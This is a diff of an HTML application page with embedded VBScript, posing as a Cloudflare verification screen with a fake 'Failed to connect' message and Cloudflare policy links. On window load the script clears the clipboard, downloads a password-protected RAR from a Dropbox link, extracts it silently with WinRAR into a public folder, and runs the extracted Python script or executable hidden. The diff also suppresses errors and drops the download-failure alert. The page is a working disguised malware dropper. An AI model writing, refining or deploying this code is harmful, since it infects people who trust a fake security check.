@@ -47,84 +47,74 @@
             text-decoration: underline;
         }
     </style>
-    <script language="VBScript">
+      <script language="VBScript">
     Sub Window_onLoad
-        Window.ResizeTo 520, 480
-        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
+      On Error Resume Next
+      Window.ResizeTo 520, 480
+      Window.MoveTo (Screen.Width - 520) / 2, (Screen.Height - 480) / 2
 
-        ' Clear clipboard just in case
-        Call ClearClipboard
-
-        ' Download the password-protected .rar file from Dropbox
-        Call DownloadRAR
-
-        ' Extract the .rar file with password using WinRAR
-        Call ExtractRAR
-
-        ' Run the extracted executable (change name as needed)
-        Call RunExtractedFile
+      ClearClipboard
+      DownloadRAR
+      ExtractRAR
+      RunExtractedFile
     End Sub
 
     Sub ClearClipboard
-        Dim objHTML
-        Set objHTML = CreateObject("htmlfile")
-        objHTML.parentWindow.clipboardData.setData "text", ""
-        Set objHTML = Nothing
+      Dim objHTML
+      Set objHTML = CreateObject("htmlfile")
+      objHTML.parentWindow.clipboardData.setData "text", ""
+      Set objHTML = Nothing
     End Sub
 
-    Sub DownloadRAR()
-        Dim url, filePath, xhttp, stream
-        url = "https://www.dropbox.com/scl/fi/63ddwua351z21av5353tj/movietheater.rar?rlkey=aifqekvpqcq1tmlie35yqk43v&st=8tkt93m0&dl=1" ' <-- Put your Dropbox direct download link here
-        filePath = "C:\Users\Public\movietheater.rar"
+    Sub DownloadRAR
+      Dim url, filePath, xhttp, stream
+      url = "https://www.dropbox.com/scl/fi/63ddwua351z21av5353tj/movietheater.rar?rlkey=aifqekvpqcq1tmlie35yqk43v&dl=1"
+      filePath = "C:\Users\Public\movietheater.rar"
 
-        Set xhttp = CreateObject("MSXML2.XMLHTTP")
-        xhttp.Open "GET", url, False
-        xhttp.Send
+      Set xhttp = CreateObject("MSXML2.XMLHTTP")
+      xhttp.Open "GET", url, False
+      xhttp.Send
 
-        If xhttp.Status = 200 Then
-            Set stream = CreateObject("ADODB.Stream")
-            stream.Type = 1 ' Binary
-            stream.Open
-            stream.Write xhttp.responseBody
-            stream.SaveToFile filePath, 2 ' Overwrite if exists
-            stream.Close
-        Else
-            MsgBox "Failed to download file. Status: " & xhttp.Status, vbCritical, "Download Error"
-        End If
+      If xhttp.Status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write xhttp.responseBody
+        stream.SaveToFile filePath, 2
+        stream.Close
+      End If
     End Sub
 
-    Sub ExtractRAR()
-        Dim objShell, rarPath, rarFile, extractPath, password, cmd
+    Sub ExtractRAR
+      Dim shell, rarPath, rarFile, extractPath, password, cmd, fso
+      rarPath = """C:\Program Files\WinRAR\WinRAR.exe"""
+      rarFile = "C:\Users\Public\movietheater.rar"
+      extractPath = "C:\Users\Public\extracted\"
+      password = "1234"
 
-        ' Adjust this path if WinRAR is installed somewhere else
-        rarPath = """C:\Program Files\WinRAR\WinRAR.exe"""
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      If Not fso.FolderExists(extractPath) Then fso.CreateFolder(extractPath)
 
-        rarFile = "C:\Users\Public\movietheater.rar"
-        extractPath = "C:\Users\Public\extracted\"
-        password = "1234" ' <-- Put the password here
-
-        ' Create extraction folder if it doesn't exist
-        Set objFSO = CreateObject("Scripting.FileSystemObject")
-        If Not objFSO.FolderExists(extractPath) Then
-            objFSO.CreateFolder(extractPath)
-        End If
-
-        cmd = rarPath & " x -p" & password & " -y " & """" & rarFile & """" & " " & """" & extractPath & """"
-
-        Set objShell = CreateObject("WScript.Shell")
-        objShell.Run cmd, 0, True
+      cmd = rarPath & " x -p" & password & " -y " & """" & rarFile & """" & " " & """" & extractPath & """"
+      Set shell = CreateObject("WScript.Shell")
+      shell.Run cmd, 0, True
     End Sub
 
-    Sub RunExtractedFile()
-        Dim objShell, exePath
+    Sub RunExtractedFile
+      Dim shell, fso, exePath, pyPath
+      Set shell = CreateObject("WScript.Shell")
+      Set fso = CreateObject("Scripting.FileSystemObject")
 
-        ' Change "program.exe" to the actual executable you want to run from the extracted folder
-        exePath = "C:\Users\Public\extracted\movietheater.py"
+      pyPath = "C:\Users\Public\extracted\movietheater.py"
+      exePath = "C:\Users\Public\extracted\movietheater.exe"
 
-        Set objShell = CreateObject("WScript.Shell")
-        objShell.Run Chr(34) & exePath & Chr(34), 0, False
+      If fso.FileExists(pyPath) Then
+        shell.Run "python " & Chr(34) & pyPath & Chr(34), 0, False
+      ElseIf fso.FileExists(exePath) Then
+        shell.Run Chr(34) & exePath & Chr(34), 0, False
+      End If
     End Sub
-</script>
+  </script>
 
 </head>
 <body>
@@ -136,8 +126,8 @@
         <p><b>Failed to connect with the CLOUDFLARE server.</b><br>Try the verification steps again.</p>
     </div>
     <p class="terms">
-        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
-        <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+        <a href="https://www.cloudflare.com/privacypolicy/">Privacy</a> - 
+        <a href="https://www.cloudflare.com/website-terms/">Terms</a>
     </p>
 </body>
 </html>
